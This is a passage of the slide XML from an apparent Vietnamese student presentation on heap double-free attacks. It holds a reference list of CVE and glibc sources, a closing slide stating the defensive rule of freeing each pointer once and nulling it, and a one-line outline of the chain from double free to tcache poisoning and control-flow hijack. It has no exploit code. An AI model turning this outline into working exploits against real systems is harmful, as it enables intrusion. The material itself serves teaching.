                <a:hlinkClick r:id="rId17" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>ZDI (TrendAI): CVE-2026-33824 RCE in Windows IKEv2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId18" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Apache: HTTP Server 2.4 vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId19" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Rescana: phân tích CVE-2026-23918</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId20" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>CISA: Known Exploited Vulnerabilities Catalog</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId21" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>glibc source (Bootlin Elixir)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="152400" indent="-152400">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId22" invalidUrl="" action="" tgtFrame="" tooltip="" history="1" highlightClick="0" endSnd="0">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>glibc 2.27 malloc.c (bminor/glibc)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1115568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29D8E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>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457200" y="457200"/>
            <a:ext cx="7223760" cy="5943600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="822960"/>
            <a:ext cx="5486400" cy="32004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NHÓM 12 · UIT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1645920"/>
            <a:ext cx="6675120" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cảm ơn thầy cô</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>và các bạn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4206240"/>
            <a:ext cx="6583680" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mỗi vùng nhớ chỉ được giải phóng đúng một lần: một con trỏ, một chủ sở hữu, free xong gán NULL.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="457200"/>
            <a:ext cx="3822192" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2581"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8092440" y="621792"/>
            <a:ext cx="3456432" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HỎI ĐÁP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8092440" y="914400"/>
            <a:ext cx="3456432" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Q &amp; A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="3520440"/>
            <a:ext cx="3822192" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="3749040"/>
            <a:ext cx="3383280" cy="2468880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>double free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  → UAF</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  → tcache poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  → ghi tuỳ ý</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  → chiếm luồng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Heap Amber Bento">
  <a:themeElements>
    <a:clrScheme name="Heap Amber Bento">
      <a:dk1>
        <a:srgbClr val="0C0E0B"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="E9E4D2"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="171A16"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="A29D8E"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="FFB000"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="FF4D3D"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="63C59A"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="6FA8FF"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="2E332B"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="070807"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="FFB000"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="BDB8A6"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Heap Amber Bent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Heap Double Free Attack</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nhom 12</dc:creator>
  <cp:lastModifiedBy>Nhom 12</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-29T10:33:53Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-29T10:33:53Z</dcterms:modified>
</cp:coreProperties>
</file>